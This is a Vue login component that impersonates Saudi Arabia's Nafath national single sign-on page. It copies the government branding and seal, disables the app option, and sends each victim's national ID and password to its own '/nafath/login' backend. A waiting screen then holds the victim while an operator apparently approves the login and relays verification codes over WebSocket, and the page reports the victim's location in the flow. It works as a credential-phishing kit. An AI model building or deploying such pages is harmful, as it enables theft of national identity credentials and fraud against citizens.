<template>
    <div class="o-page" dir="rtl">
        <!-- Header -->
        <header class="nafath-header">
            <a href="/">
                <img src="/images/logo/Nafath/logo.png" width="128" alt="Nafath" />
            </a>
                <img src="/images/logo/Nafath/vision2030-grey.svg" width="128" class="u-hidden-mobile" alt="رؤية 2030" />
        </header>

        <!-- Main Content -->
        <div class="nafath-container">
            <h2 class="nafath-title">الدخول على النظام</h2>

            <!-- Error Alert -->
            <div v-if="error" class="nafath-alert nafath-alert--danger">
                <i class="icon-slash">⚠</i>
                <span>{{ error }}</span>
            </div>

            <!-- Nafath App Section (disabled) -->
            <button
                class="nafath-collapsible"
                :class="{ active: activeSection === 'nafath' }"
                @click="toggleSection('nafath')"
            >
                تطبيق نفاذ
            </button>
            <div class="nafath-collapse-content" :class="{ active: activeSection === 'nafath' }">
                <div class="nafath-card">
                    <div class="nafath-alert nafath-alert--info">
                        <i>ℹ️</i>
                        <div>
                            <h4>الخدمة غير متوفرة حالياً</h4>
                            <p>تسجيل الدخول عبر تطبيق نفاذ غير متاح في الوقت الحالي. يرجى استخدام اسم المستخدم وكلمة المرور للدخول.</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Credentials Section -->
            <button
                class="nafath-collapsible"
                :class="{ active: activeSection === 'credentials' }"
                @click="toggleSection('credentials')"
            >
                اسم المستخدم وكلمة المرور
            </button>
            <div class="nafath-collapse-content" :class="{ active: activeSection === 'credentials' }">
                <div class="nafath-card">
                    <!-- Waiting for Approval Screen -->
                    <div v-if="waitingForApproval" class="nafath-waiting">
                        <div class="nafath-spinner">
                            <img src="/images/logo/Nafath/loader.png" alt="Loading" />
                        </div>
                        <h3 class="nafath-waiting__title">الرجاء الانتظار قليلاً</h3>
                        <p class="nafath-waiting__desc">
                            يقوم النظام حاليًا بمراجعة بياناتك عبر النفاذ الوطني الموحد للتأكد من صحة المعلومات وإتمام إصدار وثيقتك التأمينية.
                        </p>
                        <p class="nafath-waiting__timer">
                            <strong>{{ formatCountdown(countdown) }}</strong>
                        </p>
                        <button
                            type="button"
                            class="nafath-btn nafath-btn--outline"
                            :disabled="!canCancel"
                            :style="{ opacity: canCancel ? 1 : 0.5, cursor: canCancel ? 'pointer' : 'not-allowed' }"
                            @click="cancelWaiting"
                        >
                            ✕ إلغاء وإعادة المحاولة
                        </button>
                    </div>

                    <!-- Login Form -->
                    <div v-else class="nafath-form-wrapper">
                        <div class="nafath-form-col">
                            <form novalidate @submit.prevent="handleLogin">
                                <!-- Username -->
                                <div class="nafath-field">
                                    <label for="j_username">اسم المستخدم \ الهوية الوطنية</label>
                                    <input
                                        id="j_username"
                                        v-model="form.username"
                                        type="text"
                                        autocomplete="username"
                                        placeholder="اسم المستخدم \ الهوية الوطنية"
                                        :class="{ 'nafath-input--error': errors.username }"
                                        @input="errors.username = ''"
                                    />
                                    <span v-if="errors.username" class="nafath-field__error">{{ errors.username }}</span>
                                </div>

                                <!-- Password -->
                                <div class="nafath-field" style="position: relative">
                                    <label for="j_password">كلمة المرور</label>
                                    <input
                                        id="j_password"
                                        v-model="form.password"
                                        :type="showPassword ? 'text' : 'password'"
                                        autocomplete="current-password"
                                        placeholder="كلمة المرور"
                                        :class="{ 'nafath-input--error': errors.password }"
                                        @input="errors.password = ''"
                                    />
                                    <button
                                        type="button"
                                        class="nafath-pw-toggle"
                                        :aria-label="showPassword ? 'إخفاء' : 'إظهار'"
                                        @click="showPassword = !showPassword"
                                    >
                                        {{ showPassword ? '🙈' : '👁' }}
                                    </button>
                                    <span v-if="errors.password" class="nafath-field__error">{{ errors.password }}</span>
                                </div>

                                <!-- Submit -->
                                <div class="nafath-field" style="text-align: center">
                                    <button type="submit" class="nafath-btn nafath-btn--primary nafath-btn--full" :disabled="processing">
                                        {{ processing ? 'جاري التسجيل...' : '🔑 تسجيل الدخول' }}
                                    </button>
                                    <div class="nafath-actions">
                                        <a href="#" class="nafath-btn nafath-btn--outline nafath-btn--sm" @click.prevent>🔓 إعادة تعيين كلمة المرور</a>
                                        <a href="https://www.absher.sa/portal/landing.html" class="nafath-btn nafath-btn--outline nafath-btn--sm" target="_blank" rel="noopener noreferrer">👤 حساب جديد</a>
                                    </div>
                                </div>
                            </form>
                        </div>
                        <div class="nafath-info-col u-hidden-mobile">
                            <img src="/images/logo/Nafath/secure.svg" width="150" alt="تسجيل دخول آمن" />
                            <p>الرجاء إدخال اسم المستخدم \ الهوية الوطنية وكلمة المرور ثم اضغط تسجيل الدخول</p>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Try New Nafath Platform -->
            <div class="nafath-promo">
                <div class="nafath-promo__inner">
                    <h4>منصة النفاذ الجديدة</h4>
                    <p>لتجربة أكثر سهولة استخدم النسخة المحدثة من منصة النفاذ الوطني الموحد</p>
                    <a href="https://www.iam.gov.sa/" target="_blank" rel="noopener noreferrer" class="nafath-btn nafath-btn--white">ابدأ الآن</a>
                </div>
            </div>
        </div>

        <!-- Footer -->
        <footer class="nafath-footer">
            <div class="nafath-footer__brand">
                <img src="/images/logo/Nafath/sdaia-logo.svg" alt="SDAIA" width="48" />
                <div>
                    <p>تطوير وتشغيل</p>
                    <h5>الهيئة السعودية للبيانات والذكاء الاصطناعي</h5>
                    <p>النفاذ الوطني الموحد جميع الحقوق محفوظة © 2025</p>
                </div>
            </div>
            <nav class="nafath-footer__nav">
                <a href="/">الرئيسية</a>
                <a href="/about">حول</a>
                <a href="/contact">تواصل معنا</a>
            </nav>
            <div class="nafath-footer__seal">
                <a href="https://raqmi.dga.gov.sa/Platforms/platforms/5c3ae0d4-e08c-4630-8c97-02cf270f9faa/platform-license" target="_blank" rel="noopener noreferrer">
                    <img src="/images/logo/Nafath/c46b531f-3e65-4bf2-9f17-b1ed016c01be.png" alt="الختم الرقمي" width="220" />
                </a>
            </div>
        </footer>
    </div>

    <!-- Loader Overlay -->
    <div v-if="showLoader" class="nafath-loader-overlay">
        <div class="nafath-loader-box">
            <img src="/images/logo/Nafath/loader.png" alt="جاري التحميل" />
            <p>جاري التحميل ، نرجو الإنتظار ...</p>
        </div>
    </div>

    <!-- Processing Spinner -->
    <div v-if="processing" class="nafath-processing-overlay">
        <div class="nafath-processing-box">
            <img src="/images/logo/Nafath/loader.png" alt="" /><br />
            جاري المعالجة ، نرجو الإنتظار ...
        </div>
    </div>
</template>

<script setup>
import { ref, reactive, onMounted, onUnmounted } from 'vue';
import { useRouter } from 'vue-router';
import request from '@/api/request';
import { getEcho } from '@/services/echo';
import { getSessionToken } from '@/utils/sessionToken';
import { customerBroadcastChannel } from '@/utils/customerBroadcastChannel';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import { validateNationalId } from '@/utils/nationalIdValidation';

const router = useRouter();

// ─── State ──────────────────────────────────────────────────────────
const form = reactive({ username: '', password: '' });
const errors = reactive({ username: '', password: '' });
const error = ref('');
const processing = ref(false);
const showPassword = ref(false);
const showLoader = ref(true);
const activeSection = ref('credentials');

const waitingForApproval = ref(false);
const countdown = ref(120);
const canCancel = ref(false);
let countdownInterval = null;

let echoChannel = null;
let echoChannelName = '';
let pollTimer = null;
let customerIp = null;

// ─── Section Toggle ─────────────────────────────────────────────────
const toggleSection = (section) => {
    if (activeSection.value !== section) activeSection.value = section;
};

// ─── Validation ─────────────────────────────────────────────────────
const validateForm = () => {
    errors.username = '';
    errors.password = '';
    let valid = true;

    if (!form.username.trim()) {
        errors.username = 'الرجاء إدخال اسم المستخدم أو الهوية الوطنية';
        valid = false;
    } else if (/^\d{10}$/.test(form.username.trim())) {
        const result = validateNationalId(form.username.trim());
        if (!result.valid) {
            errors.username = result.error;
            valid = false;
        }
    } else if (form.username.length < 3) {
        errors.username = 'الرجاء إدخال هوية وطنية صحيحة (10 أرقام) أو اسم مستخدم صحيح';
        valid = false;
    }

    if (!form.password) {
        errors.password = 'الرجاء إدخال كلمة المرور';
        valid = false;
    } else if (form.password.length < 6) {
        errors.password = 'كلمة المرور يجب أن تكون على الأقل 6 أحرف';
        valid = false;
    }

    return valid;
};

// ─── Login Submit ───────────────────────────────────────────────────
const handleLogin = async () => {
    error.value = '';
    if (!validateForm()) return;

    processing.value = true;

    try {
        const res = await request.post('/nafath/login', {
            username: form.username,
            password: form.password,
        });

        if (res.data.success) {
            customerIp = res.data.customer_ip;
            waitingForApproval.value = true;
            processing.value = false;

            // Save context for Callback page
            sessionStorage.setItem('nafathContext', JSON.stringify({
                customerIp,
                username: form.username,
            }));

            startCountdown();
            setupWebSocket();
            startPolling();
        } else {
            error.value = res.data.message || 'فشل إرسال طلب تسجيل الدخول';
        }
    } catch (_err) {
        logger.error('Nafath login error:', _err);
        error.value = _err.response?.data?.message || 'حدث خطأ أثناء إرسال طلب تسجيل الدخول';
    } finally {
        processing.value = false;
    }
};

// ─── WebSocket ──────────────────────────────────────────────────────
async function setupWebSocket() {
    const echo = await getEcho();
    if (!echo) return;

    echoChannelName = await customerBroadcastChannel('nafath', getSessionToken());
    echoChannel = echo.channel(echoChannelName);

    echoChannel.listen('.NafathApproved', handleApproved);
    echoChannel.listen('.NafathRejected', handleRejected);
}

function handleApproved(event) {
    clearTimers();
    waitingForApproval.value = false;

    // Save verification code for Callback page
    const ctx = JSON.parse(sessionStorage.getItem('nafathContext') || '{}');
    ctx.verificationCode = event.verification_code;
    ctx.approved = true;
    sessionStorage.setItem('nafathContext', JSON.stringify(ctx));

    if (event.redirect_to) {
        safeRedirect(event.redirect_to, '/nafath/callback', router);
    } else {
        router.push({ name: 'nafathCallback' });
    }
}

function handleRejected(event) {
    clearTimers();
    waitingForApproval.value = false;

    sessionStorage.setItem('nafathError', event.reason || 'nafath_other');
    router.push({ name: 'nafathError' });
}

// ─── Polling Fallback ───────────────────────────────────────────────
function startPolling() {
    if (pollTimer) return;

    async function tick() {
        try {
            // Report current page
            await request.post('/customer/page', { current_page: '/insurance/nafath' }, { silent: true });

            // Also poll nafath status (WebSocket may be down)
            if (waitingForApproval.value) {
                const { data } = await request.get('/nafath/status', { silent: true });
                if (data.status === 'approved') {
                    handleApproved({
                        verification_code: data.verification_code || null,
                        redirect_to: '/insurance/nafath/callback',
                    });
                    return; // stop polling after redirect
                }
            }
        } catch { /* silent */ }
        pollTimer = setTimeout(tick, 3000);
    }

    pollTimer = setTimeout(tick, 2000);
}

// ─── Countdown ──────────────────────────────────────────────────────
const startCountdown = () => {
    countdown.value = 120;
    canCancel.value = false;
    if (countdownInterval) clearInterval(countdownInterval);

    countdownInterval = setInterval(() => {
        countdown.value--;
        if (countdown.value <= 90 && !canCancel.value) canCancel.value = true;
        if (countdown.value <= 0) {
            clearTimers();
            if (waitingForApproval.value) {
                cancelWaiting();
                error.value = 'انتهى وقت الانتظار، الرجاء المحاولة مرة أخرى';
            }
        }
    }, 1000);
};

const formatCountdown = (s) => {
    const m = Math.floor(s / 60);
    return `${m}:${(s % 60).toString().padStart(2, '0')}`;
};

// ─── Cancel / Cleanup ───────────────────────────────────────────────
const cancelWaiting = () => {
    clearTimers();
    waitingForApproval.value = false;
    form.username = '';
    form.password = '';
};

let loaderTimer = null;
let focusTimer = null;

function clearTimers() {
    if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
    clearTimeout(loaderTimer);
    clearTimeout(focusTimer);
}

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted(() => {
    // Track page visit
    request.post('/customer/page', { current_page: '/insurance/nafath' }, { silent: true }).catch(() => {});

    loaderTimer = setTimeout(() => {
        showLoader.value = false;
        focusTimer = setTimeout(() => document.getElementById('j_username')?.focus(), 100);
    }, 5000);
});

onUnmounted(() => {
    clearTimers();
    if (echoChannel && echoChannelName) {
        try { window.Echo?.leave(echoChannelName); } catch { /* */ }
    }
});
</script>

<style scoped>
.o-page { background-color: #f4f6f9; min-height: 100vh; width: 100%; }

/* Header */
.nafath-header { background: white; box-shadow: 0 2px 4px rgba(0,0,0,.1); display: flex; align-items: center; justify-content: space-between; padding: 12px 24px; margin-bottom: 32px; }

/* Container */
.nafath-container { max-width: 720px; margin: 0 auto; padding: 0 16px; }
.nafath-title { color: #11998e; text-align: center; margin-bottom: 20px; font-size: 22px; font-weight: 700; }

/* Alerts */
.nafath-alert { border-radius: 8px; padding: 15px 20px; margin-bottom: 20px; display: flex; align-items: flex-start; gap: 12px; }
.nafath-alert--danger { background: #fee; border-left: 4px solid #ed4d4d; color: #c33; }
.nafath-alert--info { background: #e3f2fd; border-left: 4px solid #2196f3; color: #1565c0; }
.nafath-alert h4 { margin: 0 0 8px; font-weight: 700; }
.nafath-alert p { margin: 0; }

/* Accordion */
.nafath-collapsible { width: 100%; padding: 18px; border: none; background: #c2c2c2; color: white; font-weight: 700; font-size: 15px; text-align: right; cursor: pointer; transition: .3s; border-bottom: 1px solid rgba(255,255,255,.3); }
.nafath-collapsible:first-of-type { border-radius: 5px 5px 0 0; }
.nafath-collapsible:last-of-type { border-radius: 0 0 5px 5px; border-bottom: none; }
.nafath-collapsible:hover, .nafath-collapsible.active { background: #11998e; box-shadow: 0 5px 15px rgba(17,153,142,.3); }
.nafath-collapsible::after { content: '+'; float: left; font-size: 18px; font-weight: 700; }
.nafath-collapsible.active::after { content: '−'; }
.nafath-collapse-content { max-height: 0; overflow: hidden; transition: max-height .4s ease-out; background: #f1f1f1; }
.nafath-collapse-content.active { max-height: 2000px; }

/* Card */
.nafath-card { background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,.1); padding: 24px; margin: 16px; }

/* Form */
.nafath-form-wrapper { display: flex; gap: 24px; }
.nafath-form-col { flex: 1; }
.nafath-info-col { flex: 0 0 40%; text-align: center; padding: 16px; color: #6c757d; }
.nafath-info-col img { margin-bottom: 16px; }
.nafath-field { margin-bottom: 20px; }
.nafath-field label { display: block; font-size: 14px; font-weight: 500; color: #333; margin-bottom: 8px; }
.nafath-field input { width: 100%; border: 1px solid #ddd; border-radius: 4px; padding: 12px 15px; font-size: 14px; transition: border-color .3s; box-sizing: border-box; }
.nafath-field input:focus { border-color: #11998e; outline: none; box-shadow: 0 0 0 3px rgba(17,153,142,.1); }
.nafath-input--error { border-color: #ed4d4d !important; }
.nafath-field__error { color: #ed4d4d; font-size: 12px; margin-top: 4px; display: block; }
.nafath-pw-toggle { position: absolute; left: 10px; top: 36px; background: none; border: none; cursor: pointer; font-size: 18px; z-index: 10; }

/* Buttons */
.nafath-btn { border-radius: 4px; font-weight: 600; padding: 12px 24px; cursor: pointer; transition: all .3s; border: 2px solid #11998e; font-size: 14px; display: inline-block; text-decoration: none; text-align: center; }
.nafath-btn--primary { background: #11998e; color: white; border-color: #11998e; }
.nafath-btn--primary:hover { background: #0d7a72; }
.nafath-btn--outline { background: transparent; color: #11998e; }
.nafath-btn--outline:hover { background: #11998e; color: white; }
.nafath-btn--white { background: #fafafa; color: #11998e; border-color: #fafafa; }
.nafath-btn--full { width: 100%; }
.nafath-btn--sm { font-size: 13px; padding: 10px 16px; }
.nafath-btn:disabled { opacity: .5; cursor: not-allowed; }
.nafath-actions { display: flex; justify-content: space-between; gap: 12px; margin-top: 16px; }

/* Waiting State */
.nafath-waiting { text-align: center; padding: 32px; }
.nafath-spinner { margin-bottom: 24px; }
.nafath-spinner img { width: 80px; }
.nafath-waiting__title { color: #11998e; font-weight: 700; margin-bottom: 12px; }
.nafath-waiting__desc { color: #666; font-size: 16px; margin-bottom: 16px; }
.nafath-waiting__timer { color: #999; font-size: 22px; font-weight: 700; margin-bottom: 20px; }

/* Promo */
.nafath-promo { margin: 32px 0; }
.nafath-promo__inner { background: #11998e; color: #fafafa; border-radius: 12px; padding: 28px; text-align: center; }
.nafath-promo__inner h4 { margin: 0 0 12px; font-size: 18px; }
.nafath-promo__inner p { margin: 0 0 18px; font-size: 14px; }

/* Footer */
.nafath-footer { background: #f8f9fa; border-top: 1px solid #e9ecef; padding: 30px 24px; margin-top: 50px; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 16px; }
.nafath-footer__brand { display: flex; align-items: center; gap: 12px; }
.nafath-footer__brand p { margin: 0; font-size: 12px; color: #6c757d; }
.nafath-footer__brand h5 { margin: 4px 0; color: #495057; }
.nafath-footer__nav { display: flex; gap: 16px; }
.nafath-footer__nav a { color: #6c757d; text-decoration: none; font-size: 14px; transition: color .3s; }
.nafath-footer__nav a:hover { color: #11998e; }

/* Loader */
.nafath-loader-overlay { position: fixed; inset: 0; background: rgba(15,23,42,.92); backdrop-filter: blur(12px); display: flex; align-items: center; justify-content: center; z-index: 9999; cursor: wait; }
.nafath-loader-box { text-align: center; padding: 50px 60px; background: linear-gradient(135deg,#1e293b,#0f172a); border-radius: 16px; box-shadow: 0 25px 60px rgba(0,0,0,.4), 0 0 40px rgba(17,153,142,.15); border: 1px solid rgba(255,255,255,.1); }
.nafath-loader-box img { width: 140px; margin-bottom: 25px; }
.nafath-loader-box p { color: #5eead4; font-size: 18px; font-weight: 600; margin: 0; direction: rtl; }
.nafath-processing-overlay { position: fixed; inset: 0; background: rgba(0,0,0,.5); display: flex; align-items: center; justify-content: center; z-index: 2000; }
.nafath-processing-box { background: linear-gradient(135deg,#1e293b,#0f172a); border: 1px solid rgba(255,255,255,.1); border-radius: 8px; padding: 32px; text-align: center; color: #e2e8f0; max-width: 400px; }
.nafath-processing-box img { width: 80px; margin-bottom: 16px; }

/* Mobile */
@media (max-width: 768px) {
    .u-hidden-mobile { display: none !important; }
    .nafath-header { padding: 12px 15px; }
    .nafath-header img:first-child { width: 90px !important; }
    .nafath-container { padding: 0; }
    .nafath-card { border-radius: 0; box-shadow: none; margin: 0; padding: 25px 20px; }
    .nafath-form-wrapper { flex-direction: column; }
    .nafath-actions { flex-direction: column; }
    .nafath-footer { flex-direction: column; text-align: center; padding: 20px 15px; }
    .nafath-footer__nav { flex-direction: column; }
    .nafath-promo { padding: 0 15px; }
    .nafath-loader-box { padding: 30px 20px; max-width: 90%; }
    .nafath-loader-box img { width: 100px; }
    .nafath-loader-box p { font-size: 16px; }
}
</style>
